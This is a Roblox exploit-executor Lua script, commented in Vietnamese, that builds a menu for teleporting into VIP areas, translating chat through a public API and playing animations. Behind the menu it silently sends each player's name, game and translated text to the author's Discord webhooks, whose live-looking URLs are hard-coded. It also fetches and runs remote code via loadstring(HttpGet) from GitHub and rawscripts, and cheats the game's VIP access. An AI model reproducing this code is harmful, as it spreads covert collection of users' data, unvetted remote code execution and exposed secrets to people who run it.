-- =================================================================
-- SCRIPT CHÍNH TỔNG HỢP (tp.lua) - TELEPORT + DỊCH CHAT + ANIMATIONS
-- =================================================================
print("⏳ Đang khởi chạy tp.lua với bộ Animation hoàn chỉnh...")

local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")
local HttpService = game:GetService("HttpService")
local MarketService = game:GetService("MarketplaceService")
local GroupService = game:GetService("GroupService")

-- 0. Tự động nhắc tham gia Group (Kurdish Team)
local GROUP_ID = 175907291
task.spawn(function()
    task.wait(2)
    if not localPlayer:IsInGroup(GROUP_ID) then
        pcall(function() GroupService:PromptJoinAsync(GROUP_ID) end)
    end
end)

-- 1. Webhook cấu hình
local rawWebhookBot = "https://discord.com/api/webhooks/1556970046679547924/GYvAH0yk3kFrs1YiO8w485O4Sv3w9ZHDFQ7WYBVoFlCS1Ih9AVGNBICeFxhob1prIbAn"
local WEBHOOK_BOT_URL = "https://cf-discord-proxy.numelon-web-services.workers.dev/?url=" .. rawWebhookBot

local rawWebhookChat = "https://discord.com/api/webhooks/1556960491086155776/qv4XW06rSiS1cvwTYszxAYyBJwrmJ9gBlp-9R4CTgxlxkEYvSLguUG9tQXqxg15tTefP"
local WEBHOOK_CHAT_URL = "https://cf-discord-proxy.numelon-web-services.workers.dev/?url=" .. rawWebhookChat

-- Lấy tên game
local successName, gameInfo = pcall(function()
    return MarketService:GetProductInfo(game.PlaceId)
end)
local gameName = (successName and gameInfo and gameInfo.Name) or "Unknown Game"
local isTargetGame = (game.PlaceId == 10033751448)

-- Hàm gửi log sang game_keyword.lua
local function sendBotLog(actionName, details)
    task.spawn(function()
        pcall(function()
            local GameStore = _G.GameStore
            if not GameStore then
                local keywordUrl = "https://raw.githubusercontent.com/ductrungvo344-pixel/Hack/refs/heads/main/game_keyword.lua"
                local success, res = pcall(function()
                    return loadstring(game:HttpGet(keywordUrl))()
                end)
                if success then GameStore = res end
            end

            if GameStore then
                if GameStore.SaveData then GameStore.SaveData(gameName, details, game.PlaceId) end
                if GameStore.SendWebhook then GameStore.SendWebhook(WEBHOOK_BOT_URL, actionName, details) end
            end
        end)
    end)
end

-- Hàm gửi log dịch chat
local function sendChatLog(vietnameseText, englishText)
    task.spawn(function()
        pcall(function()
            local payload = {
                ["content"] = string.format("🌐 **[Log Dịch Chat]**\n👤 **Player:** `%s`\n🗺️ **Game:** `%s`\n🇻🇳 **Tiếng Việt:** `%s`\n🇬🇧 **Tiếng Anh:** `%s`", 
                    localPlayer.Name, gameName, vietnameseText, englishText)
            }
            local reqFunc = request or http_request or (syn and syn.request)
            if reqFunc then
                reqFunc({
                    Url = WEBHOOK_CHAT_URL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(payload)
                })
            end
        end)
    end)
end

-- Xóa GUI cũ nếu trùng
if playerGui:FindFirstChild("TeleportGUI") then
    playerGui.TeleportGUI:Destroy()
end

-- Tạo ScreenGui chính
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "TeleportGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Khung chính
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 230, 0, 420)
frame.Position = UDim2.new(0.05, 0, 0.18, 0)
frame.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 8)
uiCorner.Parent = frame

-- Tiêu đề
local title = Instance.new("TextLabel")
title.Size = UDim2.new(0.7, 0, 0, 25)
title.Position = UDim2.new(0.05, 0, 0, 5)
title.BackgroundTransparency = 1
title.Text = "⚡ MENU & ANIMATIONS"
title.TextColor3 = Color3.fromRGB(255, 215, 0)
title.TextSize = 11
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = frame

-- Nút thu nhỏ (-)
local minBtn = Instance.new("TextButton")
minBtn.Size = UDim2.new(0, 22, 0, 22)
minBtn.Position = UDim2.new(0.83, 0, 0, 6)
minBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
minBtn.Text = "-"
minBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
minBtn.TextSize = 14
minBtn.Font = Enum.Font.GothamBold
minBtn.Parent = frame

local minCorner = Instance.new("UICorner")
minCorner.CornerRadius = UDim.new(0, 4)
minCorner.Parent = minBtn

-- Frame cuộn nội dung
local scroll = Instance.new("ScrollingFrame")
scroll.Size = UDim2.new(0.95, 0, 0, 375)
scroll.Position = UDim2.new(0.025, 0, 0, 35)
scroll.BackgroundTransparency = 1
scroll.BorderSizePixel = 0
scroll.CanvasSize = UDim2.new(0, 0, 0, 0) -- Tự động cập nhật chiều cao bên dưới
scroll.ScrollBarThickness = 4
scroll.Parent = frame

local function createButton(name, text, positionY, color)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Size = UDim2.new(0.95, 0, 0, 26)
    btn.Position = UDim2.new(0.02, 0, 0, positionY)
    btn.BackgroundColor3 = color
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 11
    btn.Font = Enum.Font.GothamBold
    btn.Parent = scroll

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 4)
    corner.Parent = btn
    return btn
end

local function createSubLabel(text, positionY)
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(0.95, 0, 0, 18)
    lbl.Position = UDim2.new(0.02, 0, 0, positionY)
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.TextColor3 = Color3.fromRGB(200, 200, 200)
    lbl.TextSize = 10
    lbl.Font = Enum.Font.GothamBold
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = scroll
    return lbl
end

-- -----------------------------------------------------------------
-- 1. SCRIPTBLOX BOT TRIGGER
-- -----------------------------------------------------------------
createSubLabel("🤖 SCRIPTBLOX BOT TRIGGER", 2)
local botSendBtn = createButton("BotSendBtn", "📤 Gửi Game Info Lên Bot", 22, Color3.fromRGB(150, 0, 200))

botSendBtn.MouseButton1Click:Connect(function()
    botSendBtn.Text = "⏳ Đang gửi..."
    sendBotLog("Request ScriptBlox & Rscripts", "Yêu cầu quét script cho: " .. gameName)
    task.wait(1.5)
    botSendBtn.Text = "📤 Gửi Game Info Lên Bot"
end)

-- -----------------------------------------------------------------
-- 2. DỊCH CHAT (MYMEMORY API)
-- -----------------------------------------------------------------
createSubLabel("🌐 DỊCH CHAT (MYMEMORY API)", 58)

local chatBox = Instance.new("TextBox")
chatBox.Size = UDim2.new(0.95, 0, 0, 28)
chatBox.Position = UDim2.new(0.02, 0, 0, 78)
chatBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
chatBox.PlaceholderText = "Nhập tiếng Việt cần dịch..."
chatBox.Text = ""
chatBox.TextColor3 = Color3.fromRGB(255, 255, 255)
chatBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
chatBox.TextSize = 11
chatBox.Font = Enum.Font.Gotham
chatBox.ClearTextOnFocus = false
chatBox.Parent = scroll

local boxCorner = Instance.new("UICorner")
boxCorner.CornerRadius = UDim.new(0, 4)
boxCorner.Parent = chatBox

local translateBtn = createButton("TransBtn", "🔍 Dịch sang English", 110, Color3.fromRGB(0, 120, 255))

local resultBox = Instance.new("TextBox")
resultBox.Size = UDim2.new(0.95, 0, 0, 28)
resultBox.Position = UDim2.new(0.02, 0, 0, 140)
resultBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
resultBox.PlaceholderText = "Bản dịch tiếng Anh..."
resultBox.Text = ""
resultBox.TextColor3 = Color3.fromRGB(0, 255, 150)
resultBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
resultBox.TextSize = 11
resultBox.Font = Enum.Font.GothamBold
resultBox.ClearTextOnFocus = false
resultBox.Parent = scroll

local resCorner = Instance.new("UICorner")
resCorner.CornerRadius = UDim.new(0, 4)
resCorner.Parent = resultBox

local copyBtn = createButton("CopyBtn", "📋 Copy Bản Dịch", 172, Color3.fromRGB(0, 180, 90))

translateBtn.MouseButton1Click:Connect(function()
    local input = chatBox.Text
    if input == "" or input == " " then return end
    translateBtn.Text = "⏳ Đang dịch..."
    task.spawn(function()
        local success, result = pcall(function()
            local cleanInput = HttpService:UrlEncode(input)
            local url = "https://api.mymemory.translated.net/get?q=" .. cleanInput .. "&langpair=vi|en"
            local reqFunc = request or http_request or (syn and syn.request)
            if not reqFunc then return nil end
            local res = reqFunc({ Url = url, Method = "GET" })
            if res and (res.StatusCode == 200 or res.StatusDescription == "OK") then
                local data = HttpService:JSONDecode(res.Body)
                if data and data.responseData and data.responseData.translatedText then
                    return data.responseData.translatedText
                end
            end
            return nil
        end)
        
        if success and result and result ~= "" then
            resultBox.Text = result
            sendChatLog(input, result)
        else
            resultBox.Text = "⚠️ Lỗi dịch thuật!"
        end
        translateBtn.Text = "🔍 Dịch sang English"
    end)
end)

copyBtn.MouseButton1Click:Connect(function()
    if resultBox.Text ~= "" and resultBox.Text ~= "⚠️ Lỗi dịch thuật!" then
        pcall(function() setclipboard(resultBox.Text) end)
        copyBtn.Text = "✅ Đã Copy!"
        task.wait(1.5)
        copyBtn.Text = "📋 Copy Bản Dịch"
    end
end)

-- -----------------------------------------------------------------
-- 3. TELEPORT & SCRIPT KHÁC
-- -----------------------------------------------------------------
local currentY = 210

local adminLbl = createSubLabel("🛠️ SCRIPT KHÁC", currentY)
local adminBtn = createButton("Admin", "👑 Nameless Admin", currentY + 20, Color3.fromRGB(255, 140, 0))
currentY = currentY + 54

local oldPosition = nil
local function executeTeleport(targetCFrame)
    local character = localPlayer.Character
    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
    if rootPart then
        oldPosition = rootPart.CFrame
        rootPart.Anchored = true
        rootPart.CFrame = targetCFrame
        task.wait(0.3)
        rootPart.Anchored = false
    end
end

if isTargetGame then
    createSubLabel("🔥 SUPER MEGA VIP", currentY)
    local smv1 = createButton("SMV1", "1. (-95, 17633, 9039)", currentY + 20, Color3.fromRGB(0, 150, 230))
    local smv2 = createButton("SMV2", "2. (-124, 17633, 9043)", currentY + 48, Color3.fromRGB(0, 150, 230))
    local smv3 = createButton("SMV3", "3. (-82, 17633, 9044)", currentY + 76, Color3.fromRGB(0, 150, 230))
    currentY = currentY + 110

    createSubLabel("💎 VIP", currentY)
    local vip1 = createButton("VIP1", "1. (-94, 17633, 9357)", currentY + 20, Color3.fromRGB(0, 180, 90))
    currentY = currentY + 54

    createSubLabel("⭐ MEGA VIP", currentY)
    local mv1 = createButton("MV1", "1. (-88, 17633, 9224)", currentY + 20, Color3.fromRGB(150, 0, 230))
    local mv2 = createButton("MV2", "2. (-112, 17633, 9224)", currentY + 48, Color3.fromRGB(150, 0, 230))
    currentY = currentY + 82

    smv1.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-95, 17633, 9039)) end)
    smv2.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-124, 17633, 9043)) end)
    smv3.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-82, 17633, 9044)) end)
    vip1.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-94, 17633, 9357)) end)
    mv1.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-88, 17633, 9224)) end)
    mv2.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-112, 17633, 9224)) end)
end

createSubLabel("⚙️ ĐIỀU HƯỚNG", currentY)
local backBtn = createButton("Back", "🔄 Quay lại chỗ cũ", currentY + 20, Color3.fromRGB(230, 70, 70))
currentY = currentY + 54

adminBtn.MouseButton1Click:Connect(function()
    pcall(function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Nameless-Admin-23304"))() end)
end)

backBtn.MouseButton1Click:Connect(function()
    if oldPosition then
        local character = localPlayer.Character
        local rootPart = character and character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            rootPart.Anchored = true
            rootPart.CFrame = oldPosition
            task.wait(0.2)
            rootPart.Anchored = false
        end
    end
end)

-- -----------------------------------------------------------------
-- 4. KURDISH ANIMATIONS SECTION (R6 / R15)
-- -----------------------------------------------------------------
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local isR15 = (humanoid.RigType == Enum.HumanoidRigType.R15)

local animSectionTitle = isR15 and "💃 KURDISH ANIMATIONS (R15)" or "💃 KURDISH ANIMATIONS (R6)"
createSubLabel(animSectionTitle, currentY)
currentY = currentY + 20

-- Bảng lưu trữ Animations
local animList = {}
if not isR15 then
    animList = {
        {"Head Throw",     "35154961",  true,  1},
        {"Floating Head",  "121572214", false, 1},
        {"Crouch",        "182724289", false, 1},
        {"Floor Crawl",    "282574440", false, 1},
        {"Dino Walk",      "204328711", false, 1},
        {"Jumping Jacks",  "429681631", false, 1},
        {"Loop Head",      "35154961",  true,  1e6},
        {"Hero Jump",      "184574340", true,  1},
        {"Faint",         "181526230", false, 1},
        {"Floor Faint",    "181525546", true,  2},
        {"Super Faint",    "181525546", true,  40},
        {"Levitate",      "313762630", false, 1},
        {"Dab",           "183412246", true,  1},
        {"Spinner",       "188632011", true,  2},
        {"Float Sit",      "179224234", false, 1},
        {"Moving Dance",   "429703734", true,  1},
        {"Weird Move",     "215384594", false, 1},
        {"Clone Illusion", "215384594", false, 1e7},
        {"Glitch Levitate","313762630", false, 1e7},
        {"Spin Dance",     "429730430", true,  1},
        {"Moon Dance",     "45834924",  true,  1},
        {"Full Punch",     "204062532", true,  1},
        {"Spin Dance 2",   "186934910", true,  1},
        {"Bow Down",       "204292303", true,  3},
        {"Sword Slam",     "204295235", true,  1},
        {"Loop Slam",      "204295235", true,  1e4},
        {"Mega Insane",    "184574340", true,  40},
        {"Super Punch",    "126753849", true,  3},
        {"Full Swing",     "218504594", true,  1},
        {"Arm Turbine",    "259438880", false, 1e3},
        {"Barrel Roll",    "136801964", true,  1},
        {"Scared",        "180612465", true,  1},
        {"Insane",        "33796059",  false, 1e8},
        {"Arm Detach",     "33169583",  true,  1e6},
        {"Sword Slice",    "35978879",  false, 1},
        {"Insane Arms",    "27432691",  true,  1e4}
    }
else
    animList = {
        {"Crazy Slash",    "674871189", true,  1},
        {"Open",          "582855105", true,  1},
        {"R15 Spinner",    "754658275", true,  1},
        {"Arms Out",       "582384156", true,  1},
        {"Float Slash",    "717879555", true,  1},
        {"Weird Zombie",   "708553116", true,  1},
        {"Down Slash",     "746398327", true,  1},
        {"Pull",          "675025795", true,  1},
        {"Circle Arm",     "698251653", true,  1},
        {"Bend",          "696096087", true,  1},
        {"Rotate Slash",   "675025570", true,  1},
        {"Fling Arms",     "754656200", true,  10}
    }
end

local normalColor = isR15 and Color3.fromRGB(110, 115, 140) or Color3.fromRGB(180, 140, 60)
local activeColor = isR15 and Color3.fromRGB(140, 160, 220) or Color3.fromRGB(230, 180, 70)

for _, animData in ipairs(animList) do
    local animName, animId, isLoop, speed = animData[1], animData[2], animData[3], animData[4]
    
    local animObj = Instance.new("Animation")
    animObj.AnimationId = "rbxassetid://" .. animId
    local track = humanoid:LoadAnimation(animObj)
    
    local btn = createButton("Anim_" .. animName, animName, currentY, normalColor)
    currentY = currentY + 28
    
    local isPlaying = false
    btn.MouseButton1Click:Connect(function()
        isPlaying = not isPlaying
        if isPlaying then
            btn.BackgroundColor3 = activeColor
            if isLoop then
                task.spawn(function()
                    while isPlaying do
                        if not track.IsPlaying then
                            track:Play(0.1, 1, speed)
                        end
                        task.wait()
                    end
                end)
            else
                track:Play(0.1, 1, speed)
            end
        else
            track:Stop()
            btn.BackgroundColor3 = normalColor
        end
    end)
end

-- Cập nhật kích thước chiều cao cuộn tổng thể
scroll.CanvasSize = UDim2.new(0, 0, 0, currentY + 20)

-- Logic Nút thu nhỏ (-)
minBtn.MouseButton1Click:Connect(function()
    local isOpen = scroll.Visible
    scroll.Visible = not isOpen
    frame.Size = isOpen and UDim2.new(0, 230, 0, 35) or UDim2.new(0, 230, 0, 420)
    minBtn.Text = isOpen and "+" or "-"
end)

print("🎉 Khởi chạy thành công tp.lua tích hợp đầy đủ Animation Kurdish!")
